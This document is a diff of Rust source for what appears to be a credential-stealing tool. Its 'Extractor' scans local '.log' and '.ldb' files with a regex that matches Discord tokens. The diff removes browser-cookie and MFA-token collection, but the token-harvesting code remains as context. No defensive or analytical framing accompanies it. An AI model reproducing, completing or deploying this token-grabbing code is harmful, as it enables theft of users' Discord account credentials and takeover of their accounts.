@@ -15,18 +15,7 @@ pub struct ExtractedData {
     location: String,
     tokens: Vec<String>,
     system_info: SystemInfo,
-    timestamp: u64,
-    #[serde(default)]
-    browser_cookies: Vec<BrowserCookie>,
-}
-
-#[derive(Serialize, Deserialize, Default)]
-struct BrowserCookie {
-    domain: String,
-    name: String,
-    value: String,
-    path: String,
-    expires: u64,
+    timestamp: u64
 }
 
 #[derive(Serialize, Deserialize, Default)]
@@ -163,7 +152,6 @@ impl Extractor {
 
     pub fn extract_discord_tokens(&self) -> Vec<String> {
         let mut tokens = Vec::new();
-        let mut mfas = Vec::new();
         let mut path = grab_path();
 
         for path in path.iter_mut() {
@@ -171,7 +159,6 @@ impl Extractor {
         }
 
         let token_regex = Regex::new(r"([\w-]{24}\.[\w-]{6}\.[\w-]{27})").unwrap();
-        let mfa_regex = Regex::new(r"mfa\.[\w-]{84}").unwrap();
 
         for path in &path {
             if path_exists(path) {
@@ -181,10 +168,8 @@ impl Extractor {
                             if let Some(entry_path) = entry.path().to_str() {
                                 if has_ending(entry_path, ".log") || has_ending(entry_path, ".ldb") {
                                     let stored_tokens = search_tokens(entry_path, &token_regex);
-                                    let stored_mfa = search_tokens(entry_path, &mfa_regex);
 
                                     tokens.extend(stored_tokens);
-                                    mfas.extend(stored_mfa);
                                 }
                             }
                         }
